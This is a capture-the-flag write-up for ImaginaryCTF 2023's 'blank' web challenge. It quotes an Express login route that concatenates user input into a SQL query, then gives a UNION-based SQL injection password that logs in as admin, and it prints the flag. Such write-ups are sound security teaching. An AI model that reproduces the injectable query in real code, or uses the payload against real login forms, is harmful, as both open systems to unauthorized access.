---
title: 2023 ImaginaryCTF - blank
author: thanguyen165
date: 2023-07-23 00:00:00 +0700
categories: [Write-ups, 2023_imaginaryCTF]
tags: [Web Exploitation, SQL injection]
---

* Points: 100

## Description

> I asked ChatGPT to make me a website. It refused to make it vulnerable so I added a little something to make it interesting. I might have forgotten something though...

### Attached

[blank_dist](https://imaginaryctf.org/r/FVauo#blank_dist.zip)

## Analyzation

Check the ```app.js```, these are important lines

```js
app.get('/flag', (req, res) => {
  if (req.session.username == "admin") {
    res.send('Welcome admin. The flag is ' + fs.readFileSync('flag.txt', 'utf8'));
  }
  else if (req.session.loggedIn) {
    res.status(401).send('You must be admin to get the flag.');
  } else {
    res.status(401).send('Unauthorized. Please login first.');
  }
});
```

```js
app.post('/login', (req, res) => {
  const username = req.body.username;
  const password = req.body.password;

  db.get('SELECT * FROM users WHERE username = "' + username + '" and password = "' + password+ '"', (err, row) => {
    if (err) {
      console.error(err);
      res.status(500).send('Error retrieving user');
    } else {
      if (row) {
        req.session.loggedIn = true;
        req.session.username = username;
        res.send('Login successful!');
      } else {
        res.status(401).send('Invalid username or password');
      }
    }
  });
});
```

So, username must be "admin", and we need to bypass the password checker.

## Solution

```
Username = admin 
Password = " UNION SELECT 1337,"junk","junk" -- 
```

Password values can be anything, but UNION requires same argument count and same types (or just NULL values)

The flag is
```
ictf{sqli_too_powerful_9b36140a}

```